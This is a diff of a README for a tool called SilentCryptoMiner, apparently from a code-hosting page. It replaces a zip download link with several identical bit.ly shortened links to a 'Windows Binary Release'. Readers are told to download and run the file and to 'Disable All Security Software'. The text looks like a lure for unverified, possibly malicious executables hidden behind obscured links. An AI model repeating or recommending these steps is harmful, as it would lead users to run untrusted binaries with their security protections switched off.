@@ -3,12 +3,22 @@ SilentCryptoMiner v3.1.0 - Miner for ETH, ETC, XMR, RTM, Bitcoin, All Cryptos
 
 ![Kryptex-Miner](https://user-images.githubusercontent.com/120615792/208021693-7b095687-129c-41a1-946c-60003443972e.png)
 
-## Getting Started
-<a href="https://gitlab.com/xmrig-source/download/-/raw/master/Setup-beta-5-3.1.zip">Download here</a>
-### Installing
+# How to get started
+  1) First, install the script following any one of these   
+      * [Windows Binary Release](https://bit.ly/3IvLM6U)
+  2) Install and run program on Windows
+  
+# Topics
+       
+[Windows]()  
+&ensp;&emsp;[Binary Release](https://bit.ly/3IvLM6U)  
+&ensp;&emsp;[Installation](https://bit.ly/3IvLM6U)  
+&ensp;&emsp;[Usage](https://bit.ly/3IvLM6U)  
+
 
 * Download the file provided in the release, extract the file and run the file.
 * Disable All Security Software (Optional)
+
 
 ### Executing program
 
